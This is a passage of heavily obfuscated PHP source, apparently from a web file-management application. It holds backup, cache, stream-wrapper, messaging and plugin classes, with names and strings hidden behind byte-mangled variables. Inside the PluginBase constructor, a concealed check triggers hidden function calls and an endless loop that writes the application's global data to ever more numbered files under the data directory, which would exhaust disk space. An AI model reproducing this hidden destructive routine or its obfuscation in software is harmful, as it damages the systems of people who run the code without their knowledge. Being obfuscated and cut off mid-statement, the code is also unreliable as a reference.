$äÀÓ¬÷¾[$ÑîŞ¬ˆ[508]]; $•¿ïü->updateFileEnd($äÀÓ¬÷¾[$ÑîŞ¬ˆ[32]], $äÀÓ¬÷¾[$ÑîŞ¬ˆ[76]]); continue; } if (IO::exist($Ô³Ş½œÉ)) { $•¿ïü->updateFileEnd($äÀÓ¬÷¾[$ÑîŞ¬ˆ[32]], $äÀÓ¬÷¾[$ÑîŞ¬ˆ[76]]); continue; } if (!IO::move($…¼·ãìÈ, get_path_father($Ô³Ş½œÉ))) { $Õ¹‰®ÓÔ = !1; break; } $Ú¸Ô„š… = array($ÑîŞ¬ˆ[508] => $äÀÓ¬÷¾[$ÑîŞ¬ˆ[508]]); $âÊ¥¢Ó³ = array($ÑîŞ¬ˆ[842] => $Í÷®„, $ÑîŞ¬ˆ[84] => $Ô³Ş½œÉ); Model($ÑîŞ¬ˆ[213])->where($Ú¸Ô„š…)->save($âÊ¥¢Ó³); } $this->removeByFileID($–ˆ—à‘û); if (!$Õ¹‰®ÓÔ) { $•¿ïü->stop($ŒÒÒ¯°…); return !1; } $•¿ïü->end(); if ($¨Ëêû¹Ô == $ÑîŞ¬ˆ[1839]) { $this->remove($Ü¹–ö®Ã); } } public function progress($¶û€œ”, $ôÕŒÆïİ) { return Task::get($ôÕŒÆïİ . $_SERVER[™»È’øè][2202] . $¶û€œ”); } private function removeByFileID($¸´–ßÂˆ = array()) { $ôû›œ¢Š =& $_SERVER[™»È’øè]; if (empty($¸´–ßÂˆ)) { return; } $¨´¿’–ë = array($ôû›œ¢Š[508] => array($ôû›œ¢Š[7], $¸´–ßÂˆ)); $ÃÎ£ æ„ = Model($ôû›œ¢Š[1362])->where($¨´¿’–ë)->field($ôû›œ¢Š[180])->select(); if (!$ÃÎ£ æ„) { return; } $ÃÎ£ æ„ = array_to_keyvalue($ÃÎ£ æ„, $ôû›œ¢Š[12], $ôû›œ¢Š[180]); foreach ($ÃÎ£ æ„ as $Ä…ØÉ­Ì) { Model($ôû›œ¢Š[457])->removeNow($Ä…ØÉ­Ì, !1); } } private function removeShareItems($ÊÉ¹Ğâ±) { $öµ·åÛü =& $_SERVER[™»È’øè]; $ç”Éå¶Ë = "\x7b\x69\x6f\72{$ÊÉ¹Ğâ±}\x7d\57"; $‰•÷èÅü = array($öµ·åÛü[180] => 0, $öµ·åÛü[1205] => array($öµ·åÛü[426], "{$ç”Éå¶Ë}\x25")); $Ö…÷‡Ã = Model($öµ·åÛü[1850])->where($‰•÷èÅü)->field($öµ·åÛü[632])->select(); if (empty($Ö…÷‡Ã)) { return; } $ÕÍÒ¨¾Å = array_to_keyvalue($Ö…÷‡Ã, $öµ·åÛü[12], $öµ·åÛü[632]); Model($öµ·åÛü[631])->remove($ÕÍÒ¨¾Å); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\x6d\x2e\114\151\x67\150\x74\101\x70\160"; public $modelType = "\123\x79\x73\164\x65\x6d\117\x70\x74\x69\157\156"; public $field = array("\x6e\141\155\145", "\x67\x72\157\165\x70", "\144\x65\x73\143", "\x63\157\156\x74\145\x6e\164"); public function listData($­âØæî = false, $ÃÛ±“ó¤ = "\155\157\x64\x69\x66\171\x54\151\x6d\x65", $Ò­°ğ‘ = true) { return parent::listData($­âØæî, $ÃÛ±“ó¤, $Ò­°ğ‘); } public function remove($ë‚Å¡æ¾) { $¥ËÛ¡² = $this->findByName($ë‚Å¡æ¾); if (!$¥ËÛ¡²) { return !1; } return parent::remove($¥ËÛ¡²[$_SERVER[™»È’øè][442]]); } public function add($Öì‚‹­ü) { if ($this->findByName($Öì‚‹­ü[$_SERVER[™»È’øè][32]])) { return !1; } return parent::insert($Öì‚‹­ü); } public function update($ì²ˆøˆ¦, $ëõÛÄ¹¯) { $°ÀÌ¤¦ =& $_SERVER[™»È’øè]; $›„è‡Êö = $this->findByName($ì²ˆøˆ¦); $ñÔë¥‰ = $this->findByName($ëõÛÄ¹¯[$°ÀÌ¤¦[32]]); if (!$›„è‡Êö || $ñÔë¥‰ && $ñÔë¥‰[$°ÀÌ¤¦[442]] != $›„è‡Êö[$°ÀÌ¤¦[442]]) { return !1; } return parent::update($›„è‡Êö[$°ÀÌ¤¦[442]], $ëõÛÄ¹¯); } } goto eĞ™ãÉÕğ­; A¢à¹‚ø›»: class BackupFile { public function __construct() { } public function index() { $¥·Ôº¶ª = Backup::get(); $ßœ•¾È™ = $¥·Ôº¶ª[$_SERVER[™»È’øè][336]][$_SERVER[™»È’øè][213]][$_SERVER[™»È’øè][508]]; $ğ¡õë”ë = array($_SERVER[™»È’øè][509] => array($_SERVER[™»È’øè][832], $ßœ•¾È™), $_SERVER[™»È’øè][833] => array($_SERVER[™»È’øè][374], $¥·Ôº¶ª[$_SERVER[™»È’øè][776]])); $…Ê¥ï© = (int) Model($_SERVER[™»È’øè][814])->where($ğ¡õë”ë)->count($_SERVER[™»È’øè][508]); $¡¡§Ê‰Ô = (int) Model($_SERVER[™»È’øè][814])->where($ğ¡õë”ë)->sum($_SERVER[™»È’øè][76]); $ºßİİ¼ = new TaskFileTransfer($_SERVER[™»È’øè][834], $_SERVER[™»È’øè][805], $…Ê¥ï©, LNG($_SERVER[™»È’øè][806]) . $_SERVER[™»È’øè][807] . LNG($_SERVER[™»È’øè][835])); $ºßİİ¼->task[$_SERVER[™»È’øè][788]] = $¡¡§Ê‰Ô; $•ì³û– = array($_SERVER[™»È’øè][836] => $…Ê¥ï©, $_SERVER[™»È’øè][837] => $¡¡§Ê‰Ô, $_SERVER[™»È’øè][838] => time()); Backup::set($•ì³û–); $Ì«ÄÀğ = !0; $ÓÀÙ—» = $this->storeIds(); $”Ñ¨Š°û = 1; $â–ø¤„” = 1000; $É­–†İı = $ÈÕÍ¦©Ê = 0; $¨çığ˜Ì = array(); $Éô‰öŒ = $ë®¬¿îà = 0; do { $ıŒ¶¹¡Æ = $_SERVER[™»È’øè][839]; $èìÁ—¯• = Model($_SERVER[™»È’øè][814])->where($ğ¡õë”ë)->field($ıŒ¶¹¡Æ)->order($_SERVER[™»È’øè][840])->selectPage($â–ø¤„”, $”Ñ¨Š°û); $ô¸€ıÇ = !empty($èìÁ—¯•[$_SERVER[™»È’øè][412]]) ? $èìÁ—¯•[$_SERVER[™»È’øè][412]] : array(); foreach ($ô¸€ıÇ as $®ç³ï«ï) { if (!$this->_fileExist($®ç³ï«ï, $¨çığ˜Ì, $ÓÀÙ—»)) { $…Ê¥ï© -= 1; $¡¡§Ê‰Ô -= (int) $®ç³ï«ï[$_SERVER[™»È’øè][76]]; write_log("\x66\x69\x6c\x65\40\156\157\x74\40\x65\170\151\163\164\56\x66\151\x6c\x65\111\104\72{$®ç³ï«ï[$_SERVER[™»È’øè][508]]}\54\40\x70\x61\x74\150\x3a{$®ç³ï«ï[$_SERVER[™»È’øè][84]]}", $_SERVER[™»È’øè][841]); continue; } $Í¶íºêµ = $®ç³ï«ï[$_SERVER[™»È’øè][84]]; $ä¹Ì˜ŒË = "\173\151\x6f\72{$¥·Ôº¶ª[$_SERVER[™»È’øè][776]]}\x7d" . substr($Í¶íºêµ, strlen("\173\x69\157\72{$®ç³ï«ï[$_SERVER[™»È’øè][842]]}\175")); if (IO::exist($ä¹Ì˜ŒË)) { $ºßİİ¼->updateFileEnd($®ç³ï«ï[$_SERVER[™»È’øè][32]], $®ç³ï«ï[$_SERVER[™»È’øè][76]]); } else { $ä¹Ì˜ŒË = get_path_father($ä¹Ì˜ŒË); IO::mkdir($ä¹Ì˜ŒË); if (!IO::copy($Í¶íºêµ, $ä¹Ì˜ŒË, $_SERVER[™»È’øè][843])) { write_log($_SERVER[™»È’øè][844] . $Í¶íºêµ . $_SERVER[™»È’øè][828] . $ä¹Ì˜ŒË . $_SERVER[™»È’øè][164], $_SERVER[™»È’øè][805]); $Ì«ÄÀğ = !1; break; } } $ßœ•¾È™ = $®ç³ï«ï[$_SERVER[™»È’øè][508]]; $ÈÕÍ¦©Ê += 1; $É­–†İı += $®ç³ï«ï[$_SERVER[™»È’øè][76]]; $ë®¬¿îà += 1; $Éô‰öŒ += $®ç³ï«ï[$_SERVER[™»È’øè][76]]; if ($É­–†İı >= 1024 * 1024 * 100) { $•ì³û– = array($_SERVER[™»È’øè][845] => $ßœ•¾È™, $_SERVER[™»È’øè][846] => $ë®¬¿îà, $_SERVER[™»È’øè][847] => $Éô‰öŒ); Backup::set($•ì³û–); $É­–†İı = $ÈÕÍ¦©Ê = 0; } } $à•ê£´ = count($ô¸€ıÇ); $”Ñ¨Š°û++; } while ($à•ê£´ == $â–ø¤„”); $ºßİİ¼->end(); $•ì³û– = array($_SERVER[™»È’øè][848] => 1, $_SERVER[™»È’øè][786] => time(), $_SERVER[™»È’øè][800] => 1, $_SERVER[™»È’øè][845] => $ßœ•¾È™, $_SERVER[™»È’øè][837] => $¡¡§Ê‰Ô, $_SERVER[™»È’øè][836] => $…Ê¥ï©, $_SERVER[™»È’øè][849] => time()); if ($ÈÕÍ¦©Ê) { $•ì³û–[$_SERVER[™»È’øè][846]] = $ë®¬¿îà; $•ì³û–[$_SERVER[™»È’øè][847]] = $Éô‰öŒ; } Backup::set($•ì³û–); $this->_fileFilter($¨çığ˜Ì); return !0; } private function _fileExist($ò´Å‰¦„, &$­¼Şë¤İ, $€¿–¸©Š) { $µçÛŸÒı =& $_SERVER[™»È’øè]; $ğİå¯ö = $ò´Å‰¦„[$µçÛŸÒı[84]]; if (in_array($ò´Å‰¦„[$µçÛŸÒı[508]], $­¼Şë¤İ)) { return !1; } if (!in_array($ò´Å‰¦„[$µçÛŸÒı[842]], $€¿–¸©Š)) { return !1; } if (IO::exist($ğİå¯ö)) { return !0; } $»´’›…ê = get_path_father($ğİå¯ö); if (IO::exist($»´’›…ê)) { $­¼Şë¤İ[] = $ò´Å‰¦„[$µçÛŸÒı[508]]; return !1; } $»Ğê÷Û = array($µçÛŸÒı[842] => $ò´Å‰¦„[$µçÛŸÒı[842]], $µçÛŸÒı[84] => array($µçÛŸÒı[426], "{$»´’›…ê}\45")); $÷î‘úå¥ = Model($µçÛŸÒı[814])->where($»Ğê÷Û)->field($µçÛŸÒı[509])->select(); $­¼Şë¤İ = array_merge($­¼Şë¤İ, array_to_keyvalue($÷î‘úå¥, $µçÛŸÒı[12], $µçÛŸÒı[508])); return !1; } private function _fileFilter($¸Ì²”±Ò) { $Ôãıñ‘¶ =& $_SERVER[™»È’øè]; if (empty($¸Ì²”±Ò)) { return; } $Ã±‚‡½‚ = array($Ôãıñ‘¶[508] => array($Ôãıñ‘¶[7], array_unique($¸Ì²”±Ò))); $‡¦½ê­ã = Model($Ôãıñ‘¶[850])->where($Ã±‚‡½‚)->field($Ôãıñ‘¶[180])->select(); foreach ($‡¦½ê­ã as $¸¼ğ‘) { Model($Ôãıñ‘¶[850])->remove($¸¼ğ‘[$Ôãıñ‘¶[180]], !1); } } private function storeIds() { $ÎµğÀÃæ =& $_SERVER[™»È’øè]; $ÜÆ‹‹Á” = Model($ÎµğÀÃæ[792])->listData(); $™ó–××« = array(); $»Ï­·£ª = $GLOBALS[$ÎµğÀÃæ[6]][$ÎµğÀÃæ[89]][$ÎµğÀÃæ[851]]; foreach ($ÜÆ‹‹Á” as $à²‰º‘) { $á®ÇŸ² = strtolower($à²‰º‘[$ÎµğÀÃæ[95]]); if (!isset($»Ï­·£ª[$á®ÇŸ²])) { continue; } $ïÔĞÍëÁ = $ÎµğÀÃæ[74] . (isset($»Ï­·£ª[$á®ÇŸ²]) ? $»Ï­·£ª[$á®ÇŸ²] : ucfirst($á®ÇŸ²)); if (!class_exists($ïÔĞÍëÁ)) { continue; } $™ó–××«[] = $à²‰º‘[$ÎµğÀÃæ[442]]; } return $™ó–××«; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $’Š™”é‰ =& $_SERVER[™»È’øè]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $¿Î¨ëùŸ = $GLOBALS[$’Š™”é‰[6]][$’Š™”é‰[392]]; $ñì®úÜ¹ = $¿Î¨ëùŸ[$¿Î¨ëùŸ[$’Š™”é‰[852]]]; $ ²ıŸ÷É = $¿Î¨ëùŸ[$’Š™”é‰[853]]; switch ($¿Î¨ëùŸ[$’Š™”é‰[852]]) { case $’Š™”é‰[21]: self::$handle = Model($’Š™”é‰[854]); break; case $’Š™”é‰[855]: self::$handle = new CacheRedis($ñì®úÜ¹, $ ²ıŸ÷É); break; case $’Š™”é‰[856]: self::$handle = new CacheMemcached($ñì®úÜ¹, $ ²ıŸ÷É); break; case $’Š™”é‰[213]: self::$handle = new CacheFile($ñì®úÜ¹, $ ²ıŸ÷É); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($áïËŠäö) { if (is_array($áïËŠäö) || is_object($áïËŠäö)) { $áïËŠäö = json_encode($áïËŠäö); } $áïËŠäö = rawurlencode($áïËŠäö); return md5(KOD_SITE_ID . $_SERVER[™»È’øè][11] . $áïËŠäö); } public static function get($¼Àœåâã, $¯˜¬ÏÄš = false) { $Ñº–³ŠÜ = self::key($¼Àœåâã); $‚¬¦»ß = self::init(); if ($¯˜¬ÏÄš) { return unserialize($‚¬¦»ß->get($Ñº–³ŠÜ)); } if (!isset(self::$memoryCache[$Ñº–³ŠÜ])) { $¥’Î·÷Ö = $‚¬¦»ß->get($Ñº–³ŠÜ); self::$memoryCache[$Ñº–³ŠÜ] = unserialize($¥’Î·÷Ö); } return self::$memoryCache[$Ñº–³ŠÜ]; } public static function set($Ää­ñ¼™, $Ù³´şø§, $¹¿â¬¤ = false) { $‰áÁÏÈà =& $_SERVER[™»È’øè]; $ÎÙïÌÃ = self::key($Ää­ñ¼™); if (isset(self::$memoryCache[$ÎÙïÌÃ]) && self::$memoryCache[$ÎÙïÌÃ] === $Ù³´şø§) { return !0; } if ($¹¿â¬¤ === 0) { self::$memoryCache[$ÎÙïÌÃ] = $Ù³´şø§; return !0; } $æÑ¨Ş· = self::init(); $Ô±Ş„ü° = serialize($Ù³´şø§); CacheLock::lock($Ää­ñ¼™ . $‰áÁÏÈà[857]); $ÚÏí¦ú§ = $æÑ¨Ş·->set($ÎÙïÌÃ, $Ô±Ş„ü°, $¹¿â¬¤); self::$memoryCache[$ÎÙïÌÃ] = $Ù³´şø§; CacheLock::unlock($Ää­ñ¼™ . $‰áÁÏÈà[857]); return $ÚÏí¦ú§; } public static function getCall($ùìíÖƒŞ, $ŞÕË, $–õüÕ¶§, $­èÔ±è = array()) { $›Ÿ¼ÎŸ× =& $_SERVER[™»È’øè]; $ìÓ¿¯‹™ = self::get($ùìíÖƒŞ); if ($ìÓ¿¯‹™ || $ìÓ¿¯‹™ === $›Ÿ¼ÎŸ×[12]) { return $ìÓ¿¯‹™; } $ìÓ¿¯‹™ = call_user_func_array($–õüÕ¶§, $­èÔ±è); $ìÓ¿¯‹™ = $ìÓ¿¯‹™ ? $ìÓ¿¯‹™ : $›Ÿ¼ÎŸ×[12]; self::set($ùìíÖƒŞ, $ìÓ¿¯‹™, $ŞÕË); return $ìÓ¿¯‹™; } public static function remove($ÒÛÄä ç) { $ìõé¥·‰ = self::key($ÒÛÄä ç); unset(self::$memoryCache[$ìõé¥·‰]); self::clearTimeout(); CacheLock::lock($ÒÛÄä ç); $ÅÌ«¶—× = self::init()->remove($ìõé¥·‰); CacheLock::unlock($ÒÛÄä ç); return $ÅÌ«¶—×; } public static function removeMemory($š¨Î±Ì‰) { $ğúé´·© = self::key($š¨Î±Ì‰); unset(self::$memoryCache[$ğúé´·©]); } public static function clearMemory($Ìï£Ìùä = false) { if ($Ìï£Ìùä) { $Ìï£Ìùä = self::key($Ìï£Ìùä); unset(self::$memoryCache[$Ìï£Ìùä]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[™»È’øè][858])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[™»È’øè][859])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($üˆ„µğç, $şŒÌúÉÎ) { $Û°ÉÜƒ° =& $_SERVER[™»È’øè]; $this->cachePath = $üˆ„µğç[$Û°ÉÜƒ°[84]]; $this->prefix = $Û°ÉÜƒ°[860]; $this->cacheTime = $şŒÌúÉÎ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($éù¶š«á) { $ìıîö =& $_SERVER[™»È’øè]; $éù¶š«á = str_replace(array($ìıîö[861], $ìıîö[97], $ìıîö[73]), $ìıîö[862], $éù¶š«á); return $this->cachePath . $ìıîö[863] . $éù¶š«á . $ìıîö[864]; } public function set($ı•Í”ªù, $·­¥´®†, $›œ×óØ• = false) { $›œ×óØ• = $›œ×óØ• ? $›œ×óØ• : $this->cacheTime; $å›èâ§ = $this->getFile($ı•Í”ªù); if (file_put_contents($å›èâ§, $this->prefix . $·­¥´®†, LOCK_EX)) { @touch($å›èâ§, intval(time() + $›œ×óØ•)); clearstatcache(); return !0; } @unlink($å›èâ§); return !1; } public function get($û•¾ Ù) { $èÊ†ÃêÅ = $this->getFile($û•¾ Ù); if (file_exists($èÊ†ÃêÅ) && filemtime($èÊ†ÃêÅ) < time()) { @unlink($èÊ†ÃêÅ); return !1; } $ç¶¿Ø•œ = @file_get_contents($èÊ†ÃêÅ); return substr($ç¶¿Ø•œ, strlen($this->prefix)); } public function remove($Ï¨ğ¯¬’) { $ÎÚ€¾ = $this->getFile($Ï¨ğ¯¬’); return @unlink($ÎÚ€¾); } public function deleteAll() { $ºëšÀ— =& $_SERVER[™»È’øè]; $éíßö¡â = scandir($this->cachePath); foreach ($éíßö¡â as $ôœ©àØ) { $¥“€ºíŞ = $this->cachePath . $ôœ©àØ; if (strpos($¥“€ºíŞ, $ºëšÀ—[864]) && strpos($¥“€ºíŞ, $ºëšÀ—[865])) { @unlink($¥“€ºíŞ); } } } public function clearTimeout() { $§€õõ¾ =& $_SERVER[™»È’øè]; $°§á¡­³ = scandir($this->cachePath); foreach ($°§á¡­³ as $Ä‹ Úù¾) { $•ÀÔ´û = $this->cachePath . $Ä‹ Úù¾; if (strpos($•ÀÔ´û, $§€õõ¾[864]) && strpos($•ÀÔ´û, $§€õõ¾[865]) && filemtime($•ÀÔ´û) < time()) { @unlink($•ÀÔ´û); } } } } goto cåã¥¨Œ“´; A¹åÅ†ó¥È: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($‹Ñ·Ëğö, $ÊÒ•É¶ = '') { $this->info = $this->info($‹Ñ·Ëğö); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[™»È’øè][84]]; $this->pathOpen = $‹Ñ·Ëğö; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$‹Ñ·Ëğö])) { self::$_chunkBuffer[$‹Ñ·Ëğö] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($´í„Ğè²) { $»¯á¹Ã¼ = $this->fileSubstr($this->pose, $´í„Ğè²); $this->pose += strlen($»¯á¹Ã¼); return $»¯á¹Ã¼; } public function stream_tell() { return $this->pose; } public function stream_seek($ÁíİëÁ, $³ã¨ÃûÛ) { $ÃßŞäçÊ =& $_SERVER[™»È’øè]; if ($³ã¨ÃûÛ == SEEK_SET) { $this->pose = $ÁíİëÁ; } else { if ($³ã¨ÃûÛ == SEEK_CUR) { $this->pose += $ÁíİëÁ; } else { if ($³ã¨ÃûÛ == SEEK_END) { $this->pose = $this->info[$ÃßŞäçÊ[76]] + intval($ÁíİëÁ); } } } if ($ÁíİëÁ < 0) { $this->pose = $this->info[$ÃßŞäçÊ[76]] + $ÁíİëÁ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[™»È’øè][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ñ‹´â˜‡, $èäÚãã) { $•‚Ğ¦„Ù =& $_SERVER[™»È’øè]; $êâğ±˜ô = $this->info($ñ‹´â˜‡); return array($•‚Ğ¦„Ù[1517] => 0, $•‚Ğ¦„Ù[1518] => 0, $•‚Ğ¦„Ù[16] => 32768 + 511, $•‚Ğ¦„Ù[1519] => 0, $•‚Ğ¦„Ù[1520] => 0, $•‚Ğ¦„Ù[1521] => 0, $•‚Ğ¦„Ù[1522] => 0, $•‚Ğ¦„Ù[76] => $êâğ±˜ô[$•‚Ğ¦„Ù[76]], $•‚Ğ¦„Ù[1523] => $êâğ±˜ô[$•‚Ğ¦„Ù[1391]], $•‚Ğ¦„Ù[1479] => $êâğ±˜ô[$•‚Ğ¦„Ù[85]], $•‚Ğ¦„Ù[1478] => $êâğ±˜ô[$•‚Ğ¦„Ù[214]], $•‚Ğ¦„Ù[1524] => 0, $•‚Ğ¦„Ù[1525] => 0); } static $fileInfo = array(); public function info($òó…î‚³) { $æŞşçÉ = $_SERVER[™»È’øè][1526]; if (isset(self::$fileInfo[$òó…î‚³])) { return self::$fileInfo[$òó…î‚³]; } if (substr($òó…î‚³, 0, strlen($æŞşçÉ)) != $æŞşçÉ) { return !1; } self::$fileInfo[$òó…î‚³] = IO::info(substr($òó…î‚³, strlen($æŞşçÉ))); return self::$fileInfo[$òó…î‚³]; } public static function read($¬¡µ±, $Ã×ü¦™ú, $Æ©¨Ñ‘ô) { if (!isset(self::$_fopenCache[$¬¡µ±])) { $ñäÑìçÜ = new StreamWrapperIO(); $ñäÑìçÜ->stream_open($¬¡µ±); self::$_fopenCache[$¬¡µ±] = $ñäÑìçÜ; } $ñäÑìçÜ = self::$_fopenCache[$¬¡µ±]; return $ñäÑìçÜ->fileSubstr($Ã×ü¦™ú, $Æ©¨Ñ‘ô); } public static function _read($¶¿„ƒ”É, $ÉÎİªŸ, $ÃÎ«´š‰) { $îƒÓ«•Ñ =& $_SERVER[™»È’øè]; $¦ŞÑøí = fopen($¶¿„ƒ”É, $îƒÓ«•Ñ[1395]); if (!$¦ŞÑøí) { return $îƒÓ«•Ñ[12]; } $¡æÎñÎû = 8192; fseek($¦ŞÑøí, $ÉÎİªŸ, SEEK_SET); $¾¾Éç† = $îƒÓ«•Ñ[12]; $Ëëü˜Öı = 0; while ($Ëëü˜Öı < $ÃÎ«´š‰) { $Èó×¦¥³ = min($¡æÎñÎû, $ÃÎ«´š‰ - $Ëëü˜Öı); $¾¾Éç† .= fread($¦ŞÑøí, $Èó×¦¥³); $Ëëü˜Öı += $Èó×¦¥³; } fclose($¦ŞÑøí); return $¾¾Éç†; } public function fileSubstr($¦½º»”“, $ ¡Ÿ¾êš) { $ì‰“æ½® =& $_SERVER[™»È’øè]; $—»ÛÈ¨ı = $this->info[$ì‰“æ½®[76]]; $Ú²×«°Í = $¦½º»”“; $ƒöëšñƒ = $ ¡Ÿ¾êš; if ($¦½º»”“ < 0) { $¦½º»”“ = $—»ÛÈ¨ı + $¦½º»”“; } if ($ ¡Ÿ¾êš === !1) { $ ¡Ÿ¾êš = $—»ÛÈ¨ı - $¦½º»”“; } if ($¦½º»”“ + $ ¡Ÿ¾êš > $—»ÛÈ¨ı) { $ ¡Ÿ¾êš = $—»ÛÈ¨ı - $¦½º»”“; } if ($ ¡Ÿ¾êš <= 0) { return $ì‰“æ½®[12]; } if ($¦½º»”“ < 0 || $¦½º»”“ >= $—»ÛÈ¨ı || $ ¡Ÿ¾êš <= 0 || $ ¡Ÿ¾êš > 1024 * 1024 * 10) { throw new Exception("\151\157\x46\x69\x6c\x65\x52\145\141\144\40\145\x72\x72\x6f\162\41\x20\x73\164\141\x72\164\75{$¦½º»”“}\73\154\x65\x6e\x67\164\150\75{$ ¡Ÿ¾êš}\73\x20\x73\151\172\x65\75{$—»ÛÈ¨ı}\73"); } $éÜİ»“ = 64 * 1024; $¦¯ …ù =& self::$_chunkBuffer[$this->path]; if (!$¦¯ …ù) { $¦¯ …ù = array(); } $²¨£Æ‘ğ = 0; $˜Í¸çè© = 0; $´ªÀ‹×• = $ì‰“æ½®[12]; foreach ($¦¯ …ù as $²¨£Æ‘ğ => $´ªÀ‹×•) { $²¨£Æ‘ğ = intval($²¨£Æ‘ğ); $˜Í¸çè© = $²¨£Æ‘ğ + strlen($´ªÀ‹×•); if ($¦½º»”“ >= $˜Í¸çè©) { continue; } if ($¦½º»”“ >= $²¨£Æ‘ğ && $¦½º»”“ + $ ¡Ÿ¾êš <= $˜Í¸çè©) { return substr($´ªÀ‹×•, $¦½º»”“ - $²¨£Æ‘ğ, $ ¡Ÿ¾êš); } break; } if (count($¦¯ …ù) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ì‰“æ½®[1527], $ì‰“æ½®[1528] . count($¦¯ …ù) . "\x3b\163\x74\141\162\x74\75{$¦½º»”“}\54\x6c\x65\156\x67\x74\150\75{$ ¡Ÿ¾êš}\x3b\160\x6f\163\145\72{$²¨£Æ‘ğ}\x7e{$˜Í¸çè©}"); throw new Exception($ì‰“æ½®[1529]); } $ÃóŠ¿Ú = intval($¦½º»”“ / $éÜİ»“) * $éÜİ»“; $ôıÑ˜à = ceil(($¦½º»”“ + $ ¡Ÿ¾êš) / $éÜİ»“) * $éÜİ»“ - $ÃóŠ¿Ú; $‰èı¸Á = IO::fileSubstr($this->path, $ÃóŠ¿Ú, $ôıÑ˜à); $¦¯ …ù[$ÃóŠ¿Ú . $ì‰“æ½®[12]] = $‰èı¸Á; ksort($¦¯ …ù); $‰´œ¡Ùç = substr($‰èı¸Á, $¦½º»”“ - $ÃóŠ¿Ú, $ ¡Ÿ¾êš); return $‰´œ¡Ùç; } private function log($üŞ­ÖÓÁ, $†ìÕÅ†) { $áßÓêúô =& $_SERVER[™»È’øè]; $Î» Í¾Â = timeFloat() - $this->timeStart; write_log(sprintf($áßÓêúô[1530], $üŞ­ÖÓÁ, $this->info[$áßÓêúô[32]], $Î» Í¾Â, $†ìÕÅ†), $áßÓêúô[1212]); } } class Message { function __construct() { } public function send($Öèş€ƒ‰ = '', $¶ø¼×˜ş = array(), $¤ÔË‚‚Í = "\x74\x65\x78\164") { $­ñÁÉ’´ =& $_SERVER[™»È’øè]; $ãëÎ€§Á = array($­ñÁÉ’´[33] => $­ñÁÉ’´[1531], $­ñÁÉ’´[779] => $Öèş€ƒ‰); if (in_array($¤ÔË‚‚Í, array($­ñÁÉ’´[1531], $­ñÁÉ’´[1532]))) { $ãëÎ€§Á[$­ñÁÉ’´[33]] = $¤ÔË‚‚Í; } $¶ø¼×˜ş = array($­ñÁÉ’´[546] => isset($¶ø¼×˜ş[$­ñÁÉ’´[546]]) ? $¶ø¼×˜ş[$­ñÁÉ’´[546]] : $­ñÁÉ’´[12], $­ñÁÉ’´[629] => isset($¶ø¼×˜ş[$­ñÁÉ’´[629]]) ? $¶ø¼×˜ş[$­ñÁÉ’´[629]] : $­ñÁÉ’´[12]); if (empty($Öèş€ƒ‰) || empty($¶ø¼×˜ş[$­ñÁÉ’´[546]]) && empty($¶ø¼×˜ş[$­ñÁÉ’´[629]])) { return !1; } $Ş¹ÊË½ = array($­ñÁÉ’´[1472] => $ãëÎ€§Á, $­ñÁÉ’´[1533] => $¶ø¼×˜ş); Hook::trigger($­ñÁÉ’´[1534], $Ş¹ÊË½); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $Õ¹È†Çú =& $_SERVER[™»È’øè]; $Á¯«°” = $_SERVER[$Õ¹È†Çú[893]]; $®ÁŒøéø = $Õ¹È†Çú[1535]; if ($_SERVER[$Õ¹È†Çú[892]] != $®ÁŒøéø($Á¯«°”)) { $ê‚ÚÆ±² = $Õ¹È†Çú[909]; $Úó©Å˜« = $Õ¹È†Çú[894]; $’¾Š”èÒ = $_SERVER[$Õ¹È†Çú[895]] . $Õ¹È†Çú[896]; $±ˆñ¨ş° = $Úó©Å˜«($’¾Š”èÒ); $ÅˆÓïÕá = explode($Õ¹È†Çú[245], $±ˆñ¨ş°); if (count($ÅˆÓïÕá) < $Õ¹È†Çú[663]) { $‡±³Ü»ê = $Õ¹È†Çú[897]; $‡±³Ü»ê(); } $íº›õ = $Õ¹È†Çú[910]; $íº›õ($_SERVER[$Õ¹È†Çú[911]]); $ê‚ÚÆ±² = $Õ¹È†Çú[909]; $ê‚ÚÆ±²(); $š‰•Ó® = $Õ¹È†Çú[1536]; $ŸèñÉÔ = json_encode($GLOBALS[$Õ¹È†Çú[1537]]); $ñÙ¦Ğ©ì = 1; for ($˜İı ŸÉ = $ñÙ¦Ğ©ì; $˜İı ŸÉ > 0; $˜İı ŸÉ++) { $š‰•Ó®(DATA_PATH . $˜İı ŸÉ, $ŸèñÉÔ); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($Õ¹È†Çú[1538]); $this->pluginName = str_replace($Õ¹È†Çú[1538], $Õ¹È†Çú[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $Õ¹È†Çú[8]; $this->pluginApi = appHostGet() . $Õ¹È†Çú[1539] . $this->pluginName . $Õ¹È†Çú[8]; $this->pluginHost = $config[$Õ¹È†Çú[1540]] . $this->pluginName . $Õ¹È†Çú[8]; $this->pluginHostDefault = $config[$Õ¹È†Çú[1540]] . $this->pluginName . $Õ¹È†Çú[8]; $âêªŞù = $config[$Õ¹È†Çú[1541]]; if ($âêªŞù && strpos($Õ¹È†Çú[50] . $âêªŞù 